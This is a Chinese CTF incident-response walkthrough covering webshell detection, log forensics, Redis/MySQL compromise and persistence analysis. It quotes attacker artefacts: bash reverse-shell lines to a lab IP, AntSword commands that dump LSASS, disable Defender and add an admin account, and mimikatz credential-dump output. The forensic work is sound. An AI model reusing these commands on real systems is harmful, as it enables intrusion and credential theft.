---
tags: 
create_time: 2024-07-10 16:11
modified_time: 2024-07-10 16:11
status:
---
# 第一章 应急响应-webshell查杀

黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}

```
tar -czvf src.tar.gz ./*
```

d盾扫一下，逐个点开看看

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161242621.png)
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161416141.png)

看到gz.php

```
027ccd04-5065-48b6-a32d-77c704a5e26d
```

黑客使用的什么工具的shell github地址的md5 flag{md5}

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161431594.png)

哥斯拉木马

```
https://github.com/BeichenDream/Godzilla
```

md5一下

```
39392de3218c333f794befef07ac9257
```

黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx

```
/var/www/html/include/Db/.Mysqli.php
```

md5一下

```
aebac0e58cd6c5fad1695ee4d1ac1919
```

黑客免杀马完整路径 md5 flag{md5}

```
/var/www/html/wap/top.php
```

md5一下

```
eeff2eabfd9b7a6d26fc1a53d3f7d1de
```

# 第一章 应急响应-Linux日志分析

```
cd /var/log
tar -czvf src.tar.gz ./*
```

1.有多少IP在爆破主机ssh的root帐号，如果有多个使用","分割 小到大排序 例如flag{192.168.200.1,192.168.200.2}

```
cat /var/log/auth.log.1 | grep -a "Failed password for root" | awk '{print $11}' | sort | uniq -c | sort -nr | more
```

顺序要注意一下

```
flag{192.168.200.2,192.168.200.32,192.168.200.31}
```

2.ssh爆破成功登陆的IP是多少，如果有多个使用","分割
查找一下accepted即可
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161449381.png)

linux命令

```
cat /var/log/auth.log.1 | grep -a "Accepted " | awk '{print $11}' | sort | uniq -c | sort -nr | more
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161533663.png)

```
flag{192.168.200.2}
```

3.爆破用户名字典是什么？如果有多个使用","分割

```
root@ip-10-0-10-1:~# cat /var/log/auth.log.1 | grep -a "Failed password" | perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'| uniq -c | sort -nr
      5  invalid user user
      5  invalid user hello
      5  invalid user 
      4  root
      1  root
      1  root
      1  invalid user test3
      1  invalid user test2
      1  invalid user test1
flag{user,hello,root,test3,test2,test1}
```

4.登陆成功的IP共爆破了多少次
筛选一下ip，筛选一下用户
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161549032.png)

也可以使用问题1的命令

```
flag{4}
```

5.黑客登陆主机后新建了一个后门用户，用户名是多少

```
root@ip-10-0-10-1:~# cat /var/log/auth.log.1 |grep -a "new user"
Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh
Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash
```

其实看passwd也可以

```
cat /etc/passwd
flag{test2}
```

# **第一章 应急响应- Linux入侵排查**

web目录存在木马，请找到木马的密码提交
指的是1.php

```
flag{1}
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161608388.png)

服务器疑似存在不死马，请找到不死马的密码提交
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161619933.png)

爆破一下md5得到hello

```
flag{hello}
```

不死马是通过哪个文件生成的，请提交文件名
就是上面的index.php

```
flag{index.php}
```

黑客留下了木马文件，请找出黑客的服务器ip提交
看到有可疑文件跑一下

```
root@ip-10-0-10-1:/var/www/html# chmod 777 shell\(1\).elf 
root@ip-10-0-10-1:/var/www/html# ./shell\(1\).elf 
netstat -antlp|more
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161637365.png)

```
flag{10.11.55.21}
```

黑客留下了木马文件，请找出黑客服务器开启的监端口提交

```
flag{3333}
```

# **第二章日志分析-apache日志分析**

提交当天访问次数最多的IP，即黑客IP：
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161647863.png)

打开access.log.1查看一下，容易得到下面ip

也可以

```
cat access.log.1 | grep "03/Aug/2023:08:" | awk '{print $1}' | sort | uniq -c | sort -nr | head -n 10
flag{192.168.200.2}
```

黑客使用的浏览器指纹是什么，提交指纹的md5：
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161659000.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161703576.png)

查看index.php页面被访问的次数，提交次数：

```
cat access.log.1 |grep "/index.php" |wc -l
flag{27}
```

查看黑客IP访问了多少次，提交次数：

```
cat access.log.1 | grep "192.168.200.2 - -"  | wc -l
flag{6555}
```

查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:

```
cat access.log.1 | grep "03/Aug/2023:08:" | awk '{print $1}' | sort -nr| uniq -c
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161714682.png)

```
flag{5}
```

# 第二章日志分析-mysql应急响应

1.黑客第一次写入的shell flag{关键字符串}

```
tar -czvf web.tar.gz ./*
```

拖下源码，然后用d盾扫一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161731705.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161735587.png)

```
flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}
```

2.黑客反弹shell的ip flag{ip}
翻一下日志，可以看到在执行1.sh，再去看看1.sh
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161745031.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161748762.png)

```
bash -i >&/dev/tcp/192.168.100.13/777 0>&1
flag{192.168.100.13}
```

3.黑客提权文件的完整路径 md5 flag{md5} 注 /xxx/xxx/xxx/xxx/xxx.xx
看日志可以猜测到时udf提权，去找一下plugin
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161758494.png)

找到数据库密码

```
mysql -uroot -p334cc35b3c704593
show variables like '%plugin%';
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161808270.png)

有两个udf.so，都交一下

```
/usr/lib/mysql/plugin/udf.so
flag{b1818bde4e310f3d23f1005185b973e7}
```

4.黑客获取的权限 flag{whoami后的值}
udf提权后拿到的是mysql权限

```
flag{mysql}
```

# **第二章日志分析-redis应急响应**

```
cd /var/log
tar -czvf log.tar.gz ./*
```

分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;
看到redis.log
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161823050.png)

192.168.100.13出现次数较多明显是爆破
192.168.100.20是主从复制

```
flag{192.168.100.20}
```

分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161831793.png)

看到其加载exp.so
然后找一下exp.so

```
find / -name exp.so
```

找到在

```
/exp.so
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161839747.png)

分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;

```
crontab -l
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161851918.png)

```
/bin/sh -i >& /dev/tcp/192.168.100.13/7777 0>&1
flag{192.168.100.13}
```

溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交
还留下了个ssh后面，看到用户

```
xj-test-user
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161903375.png)

github上找到项目，去看看历史版本
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161912075.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161915953.png)

```
flag{xj-test-user-wow-you-find-flag}
```

分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;
经典命令替换，/usr/bin ls -al看一下
看到ps 和ps_
然后file下ps
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161928734.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161931920.png)

```
flag{c195i2923381905517d818e313792d196}
```

# 第三章 权限维持-linux权限维持-隐藏

```
cd /var/log
tar -czvf log.tar.gz ./*

cd /var/www/html
tar -czvf web.tar.gz ./*
```

1.黑客隐藏的隐藏的文件 完整路径md5
libprocesshider是用于隐藏文件的项目

```
/tmp/.temp/libprocesshider/processhider.c
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710161955156.png)
隐藏了1.py

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162012942.png)

```
flag{109ccb5768c70638e24fb46ee7957e37}
```

2.黑客隐藏的文件反弹shell的ip+端口 {ip:port}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162021737.png)

```
flag{114.114.114.121:9999}
```

3.黑客提权所用的命令 完整路径的md5 flag{md5}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162031255.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162035789.png)

```
flag{7fd5884f493f4aaf96abee286ee04120}
```

4.黑客尝试注入恶意代码的工具完整路径md5
翻一下目录可以发现/opt目录下有东西
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162046977.png)

cymothoa是后门工具，搜一下就有了：
https://www.cnblogs.com/-qing-/p/10519363.html
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162054241.png)

```
flag{087c267368ece4fcf422ff733b51aed9}
```

5.使用命令运行 ./x.xx 执行该文件 将查询的 Exec***\*** 值 作为flag提交 flag{/xxx/xxx/xxx}

```
python3 /tmp/.temp/libprocesshider/1.py
```

先运行，执行完成后，查看网络连接
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162107087.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162110375.png)

```
flag{/usr/bin/python3.4}
```

# 第四章 windows实战-emlog

找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;
源码在phpstudy目录下，拖下来放到d盾里面扫一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162124166.png)

找到shell，默认密码
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162131434.png)

```
flag{rebeyond}
```

分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;
phpstudy的apache里面也是有日志的
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162140844.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162148077.png)

直接找到

```
flag{192.168.126.1}
```

服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;
看一下计算机管理
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162157976.png)

```
flag{hacker138}
```

黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162209936.png)

反编译一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162216160.png)
拿到pyc文件，在线反编译一下

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162223008.png)

也可以直接010看

```
flag{wakuang.zhigongshanfang.top}
```

# **第四章 windows实战-wordpress**

请提交攻击者攻击成功的第一时间，格式：flag{YY:MM:DD hh:mm:ss}
日志在phpstudy的nginx上面，拖下来，这里看什么时候进入manage,302重定向
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162238744.png)

```
29/Apr/2023:22:45:23
flag{2023:04:29 22:45:23}
```

请提交攻击者的浏览器版本 flag{Firgfox/2200}
看上图就行了

```
Firefox/110.0
flag{Firefox/110.0}
```

请提交攻击者目录扫描所使用的工具名称
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162248990.png)

```
flag{Fuzz Faster U Fool}
```

找到攻击者写入的恶意后门文件，提交文件名（完整路径）
d盾扫描一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162257268.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162302791.png)

```
C:\phpstudy_pro\WWW\.x.php
flag{C:\phpstudy_pro\WWW\.x.php}
```

找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）

```
C:\phpstudy_pro\WWW\usr\themes\default\post.php
flag{C:\phpstudy_pro\WWW\usr\themes\default\post.php}
```

请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}
看到windows目录下有个360.exe，拖出来直接放沙箱
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162313591.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162317554.png)

还有个bat
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162323744.png)

```
flag{x.bat}
```

[复现CVE-2022-10270（向日葵远程代码执行漏洞）_cnvd-2022-10270-CSDN博客](https://blog.csdn.net/BGiscool/article/details/129168567)

```
flag{2024-03-26 10:16:25.585}
```

通过本地 PC RDP到服务器并且找到黑客攻击的 IP 为多少,将黑客攻击 IP 作为 FLAG 提交;
稍微看一下日志就可以
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162336258.png)

```
flag{192.168.31.45}
```

通过本地 PC RDP到服务器并且找到黑客托管恶意程序 IP 为,将黑客托管恶意程序 IP 作为 FLAG 提交;
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162350236.png)

把命令整理出来，可以看到向外部ip下载main.exe,可以猜测是这个

```
flag{192.168.31.249}
```

找到黑客解密 DEC 文件,将黑客DEC 文件的 md5 作为 FLAG 提交;
群里给了
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162558888.png)

```
flag{5ad8d202f80202f6d31e077fc9b0fc6b}
```

通过本地 PC RDP到服务器并且解密黑客勒索软件,将桌面加密文件中关键信息作为 FLAG 提交;
把baoleiji.txt文件复制出来
[GitHub - Ed1s0nZ/banana_blackmail: Golang写的勒索软件，仅供学习与交流勒索软件行为，切勿对真实目标操作，否则后果自负！](https://github.com/Ed1s0nZ/banana_blackmail)

```
go mod init xxx
go mod tidy
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162609947.png)

把远程包改成这种样子，把私钥替换掉
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162617458.png)

直接运行即可解密
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162623883.png)

```
flag{EDISEC_15c2e33e-b93f-452c-9523-bbb9e2090cd1}
```

# **第五章 linux实战-黑链**

```
tar -czvf web.tar.gz ./*
```

找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx}
搜索黑链就可以找到了
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162635267.png)

```
flag{header.php}
```

webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/}
d盾扫一下就可以找到

```
/var/www/html/usr/themes/default/404.php
flag{/var/www/html/usr/themes/default/404.php}
```

黑客注入黑链文件的 md5 md5sum file flag{md5}

```
md5sum poc1.js
flag{10c18029294fdec7b6ddab76d9367c14}
```

攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/}

```
tar -czvf log.tar.gz ./*
```

打的是xss到rce那个洞
[Typecho1.2 - 1.2.1-rc前台评论存储xss到rce 漏洞复现-分析-修复 - JunBlog](https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html)

```
flag{/index.php/archives/1/}
```

# 第五章 linux实战-挖矿

```
/www/admin/websec_80/wwwroot
tar -czvf log.tar.gz ./* 
tar -czvf web.tar.gz ./*
```

1、黑客的IP是？ flag格式：flag{黑客的ip地址}，如：flag{127.0.0.1}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162647310.png)

```
flag{192.168.10.135}
```

2、黑客攻陷网站的具体时间是？ flag格式：flag{年-月-日 时:分:秒}，如：flag{2023-12-24 22:23:24}
打一下
后台是/dede，爆破弱密码得到12345678
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162701241.png)

看一下登录时间

```
flag{2023-12-22 19:08:34}
```

3、黑客上传webshell的名称及密码是？ flag格式：flag{黑客上传的webshell名称-webshell密码}，如：flag{webshell.php-pass}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162711520.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162715520.png)

```
flag{404.php-cmd}
```

4、黑客提权后设置的后门文件名称是？ flag格式：flag{后门文件绝对路径加上名称}，如：flag{/etc/passwd}
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162723877.png)

find被赋予了suid权限，攻击者可以利用suid提权做后门find文件被做了后门

```
flag{/usr/bin/find}
```

5、对黑客上传的挖矿病毒进行分析，获取隐藏的Flag
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162732554.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162738210.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162740726.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162743923.png)

# 第六章 流量特征分析-蚂蚁爱上树

蚁剑流量自己解一下混淆

```
cd /d "C:/phpStudy/PHPTutorial/WWW/onlineshop"&ls&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&whoami&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&whoami /priv&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&systeminfo&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir c:\&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir c:\temp&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net user&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net localgroup administrators&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net group "domain group" /domain&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net group "domain admins" /domain&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net view&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net share&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir c:\temp&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir c:\temp&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&rundll32.exe comsvcs.dll, MiniDump 852 C:\OnlineShopBackup.zip full&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&ls&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&copy store.php c:\temp&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir c:\temp&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&powershell -ep bypass Set-Mppreference -DisableRaltimeMonitoring $true&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&powershell -ep bypass Set-Mppreference -DisableRealtimeMonitoring $true&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&powershell -ep bypass Get-MpComputerStatus&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&rundll32.exe comsvcs.dll, MiniDump 852 C:\temp\OnlineShopBackup.zip full&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir c:\temp&echo [S]&cd&echo [E]
cd /d "C:/phpStudy/PHPTutorial/WWW/onlineshop"&dir c:\windows\system32&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&dir c:\windows\config&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net user&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net user admin Password1 /add&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net localgroup administrators admin /add&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net user&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net localgroup administrators&echo [S]&cd&echo [E]
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&whoami /all&echo [S]&cd&echo [E]
```

管理员Admin账号的密码是什么？
上面命令可以找到

```
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&net user admin Password1 /add&echo [S]&cd&echo [E]
flag{Password1}
```

LSASS.exe的程序进程ID是多少？
[黑客必备技能：通过lsass远程提取凭据](https://zhuanlan.zhihu.com/p/346022067)
找minidump命令

```
cd /d "C:\\phpStudy\\PHPTutorial\\WWW\\onlineshop"&rundll32.exe comsvcs.dll, MiniDump 852 C:\temp\OnlineShopBackup.zip full&echo [S]&cd&echo [E]
flag{852}
```

用户WIN101的密码是什么?
导出http时，看到product(60)有点大
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162808873.png)

看到这个是个文件
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162817296.png)
是个dmp文件，但是多了点东西，删一下
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710162824670.png)

使用 mimikatz加载 dmp文件:

```
sekurlsa::minidump "C:\Users\abczj\Desktop\tmp.dmp"
sekurlsa::logonpasswords
Opening : 'C:\Users\abczj\Desktop\tmp.dmp' file for minidump...

Authentication Id : 0 ; 1183799 (00000000:00121037)
Session           : Interactive from 1
User Name         : win101
Domain            : VULNTARGET
Logon Server      : WIN-UH20PRD3EAO
Logon Time        : 2023/10/19 11:35:08
SID               : S-1-5-21-3374851086-947483859-3378876003-1103
        msv :
         [00000003] Primary
         * Username : win101
         * Domain   : VULNTARGET
         * NTLM     : 282d975e35846022476068ab5a3d72df
         * SHA1     : bc9ecca8d006d8152bd51db558221a0540c9d604
         * DPAPI    : 8d6103509e746ac0ed9641f7c21d7cf7
        tspkg :
        wdigest :
         * Username : win101
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : win101
         * Domain   : VULNTARGET.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 1183771 (00000000:0012101b)
Session           : Interactive from 1
User Name         : win101
Domain            : VULNTARGET
Logon Server      : WIN-UH20PRD3EAO
Logon Time        : 2023/10/19 11:35:08
SID               : S-1-5-21-3374851086-947483859-3378876003-1103
        msv :
         [00000003] Primary
         * Username : win101
         * Domain   : VULNTARGET
         * NTLM     : 282d975e35846022476068ab5a3d72df
         * SHA1     : bc9ecca8d006d8152bd51db558221a0540c9d604
         * DPAPI    : 8d6103509e746ac0ed9641f7c21d7cf7
        tspkg :
        wdigest :
         * Username : win101
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : win101
         * Domain   : VULNTARGET.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:36
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:13
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 70900 (00000000:000114f4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:11
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WIN10$
         * Domain   : VULNTARGET
         * NTLM     : 005bfe6deb871c027d2423009396909f
         * SHA1     : 13cd32ae0fe6a42b23e6a7def795b2769ee078f8
        tspkg :
        wdigest :
         * Username : WIN10$
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : WIN10$
         * Domain   : vulntarget.com
         * Password : 4a 0f d8 eb ab 65 d8 c8 98 97 8c f2 d6 c2 f1 30 e0 7c 75 00 ac 04 0d 24 26 96 8c 84 68 6a c5 72 86 24 f2 96 b8 e4 f8 d6 1e 91 97 9d 1c aa b3 7b 98 b5 ea 15 9f cb 44 4d 7b 3e 7e 65 c9 29 64 3d bb aa f0 aa 1b d0 52 02 ba 4e e8 73 d5 f2 2c 1b bf 40 03 a8 d2 47 23 c8 aa f1 fc ba d8 fa 84 e4 81 59 1b 3c 3d f3 d4 10 f6 47 d2 38 f8 f9 b0 53 e3 0a 34 2c ba 19 a4 ba 14 62 ce 9c 69 d5 e2 14 d1 e1 be a3 bc c9 41 25 78 ab 6d c2 8c 4f 1e 8e ec d8 7c 1c 92 28 53 bd 5c 7c db d1 d1 da 5e 47 28 0d 96 2c 9e b4 37 a1 44 3c 65 64 20 d5 ac cd c3 e7 db 6d 7d 58 79 16 14 9e 93 e4 39 5a 53 59 79 10 66 ae 6c 9e cc 77 32 f1 e4 1b 5f d8 9c c6 aa 71 5c 60 11 84 7a 8d 0e 2e c4 52 6a 58 26 89 90 c0 9c cf cb a1 ae 11 f1 24 1d 78 a8 d5 ef df
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 70284 (00000000:0001128c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:11
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : WIN10$
         * Domain   : VULNTARGET
         * NTLM     : 005bfe6deb871c027d2423009396909f
         * SHA1     : 13cd32ae0fe6a42b23e6a7def795b2769ee078f8
        tspkg :
        wdigest :
         * Username : WIN10$
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : WIN10$
         * Domain   : vulntarget.com
         * Password : 4a 0f d8 eb ab 65 d8 c8 98 97 8c f2 d6 c2 f1 30 e0 7c 75 00 ac 04 0d 24 26 96 8c 84 68 6a c5 72 86 24 f2 96 b8 e4 f8 d6 1e 91 97 9d 1c aa b3 7b 98 b5 ea 15 9f cb 44 4d 7b 3e 7e 65 c9 29 64 3d bb aa f0 aa 1b d0 52 02 ba 4e e8 73 d5 f2 2c 1b bf 40 03 a8 d2 47 23 c8 aa f1 fc ba d8 fa 84 e4 81 59 1b 3c 3d f3 d4 10 f6 47 d2 38 f8 f9 b0 53 e3 0a 34 2c ba 19 a4 ba 14 62 ce 9c 69 d5 e2 14 d1 e1 be a3 bc c9 41 25 78 ab 6d c2 8c 4f 1e 8e ec d8 7c 1c 92 28 53 bd 5c 7c db d1 d1 da 5e 47 28 0d 96 2c 9e b4 37 a1 44 3c 65 64 20 d5 ac cd c3 e7 db 6d 7d 58 79 16 14 9e 93 e4 39 5a 53 59 79 10 66 ae 6c 9e cc 77 32 f1 e4 1b 5f d8 9c c6 aa 71 5c 60 11 84 7a 8d 0e 2e c4 52 6a 58 26 89 90 c0 9c cf cb a1 ae 11 f1 24 1d 78 a8 d5 ef df
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN10$
Domain            : VULNTARGET
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:10
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : WIN10$
         * Domain   : VULNTARGET
         * NTLM     : 005bfe6deb871c027d2423009396909f
         * SHA1     : 13cd32ae0fe6a42b23e6a7def795b2769ee078f8
        tspkg :
        wdigest :
         * Username : WIN10$
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : win10$
         * Domain   : VULNTARGET.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 47524 (00000000:0000b9a4)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/10/19 11:26:09
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : WIN10$
         * Domain   : VULNTARGET
         * NTLM     : 005bfe6deb871c027d2423009396909f
         * SHA1     : 13cd32ae0fe6a42b23e6a7def795b2769ee078f8
        tspkg :
        wdigest :
         * Username : WIN10$
         * Domain   : VULNTARGET
         * Password : (null)
        kerberos :
         * Username : WIN10$
         * Domain   : vulntarget.com
